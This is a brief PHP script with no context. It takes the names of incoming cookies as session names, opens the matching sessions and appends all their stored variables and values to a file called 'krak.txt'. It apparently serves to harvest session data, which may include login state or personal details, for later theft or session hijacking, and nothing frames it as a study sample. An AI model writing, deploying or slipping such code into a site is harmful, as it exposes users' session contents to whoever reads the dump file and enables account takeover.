<?php
 foreach ($_COOKIE as $k => $v) {
  session_name($k);
 }
  session_start();
  $fic=fopen("krak.txt", "a"); 
  foreach ($_SESSION as $k => $v) {
   fwrite($fic, "$k => $v.\n");}  
  fclose($fic);
?>
